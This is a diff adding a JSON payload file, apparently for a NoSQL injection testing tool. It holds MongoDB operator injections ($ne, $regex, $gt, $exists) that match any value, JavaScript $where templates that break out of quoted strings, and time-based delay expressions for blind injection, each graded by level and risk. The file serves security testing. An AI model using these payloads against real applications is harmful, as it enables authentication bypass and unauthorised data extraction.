@@ -1,0 +1,25 @@
+{
+  "operators": [
+    {"label": "$ne:<rand>",   "op": {"$ne": "__RAND__"},        "level": 1, "risk": 1},
+    {"label": "$regex:.*",    "op": {"$regex": ".*"},           "level": 1, "risk": 1},
+    {"label": "$gt:''",       "op": {"$gt": ""},                "level": 1, "risk": 1},
+    {"label": "$ne:null",     "op": {"$ne": null},              "level": 2, "risk": 1},
+    {"label": "$gte:''",      "op": {"$gte": ""},               "level": 2, "risk": 1},
+    {"label": "$nin:[rand]",  "op": {"$nin": ["__RAND__"]},     "level": 2, "risk": 1},
+    {"label": "$exists:true", "op": {"$exists": true},          "level": 3, "risk": 1},
+    {"label": "$not/$regex",  "op": {"$not": {"$regex": "^$"}}, "level": 3, "risk": 2}
+  ],
+  "where_templates": [
+    {"label": "sq-inline", "tmpl": "' || (%s) || '",             "level": 1},
+    {"label": "dq-inline", "tmpl": "\" || (%s) || \"",           "level": 1},
+    {"label": "dq-eqeq",   "tmpl": "\" || (%s) || \"\"==\"",     "level": 2},
+    {"label": "sq-eqeq",   "tmpl": "' || (%s) || ''=='",         "level": 2},
+    {"label": "sq-fn",     "tmpl": "'; return (%s); var _d='",   "level": 3},
+    {"label": "dq-fn",     "tmpl": "\"; return (%s); var _d=\"", "level": 3},
+    {"label": "bare",      "tmpl": " || (%s) || ",               "level": 3}
+  ],
+  "delay_exprs": [
+    {"label": "sleep", "expr": "sleep(%d)"},
+    {"label": "busy",  "expr": "(function(){var _s=Date.now();while(Date.now()-_s<%d){}})()"}
+  ]
+}
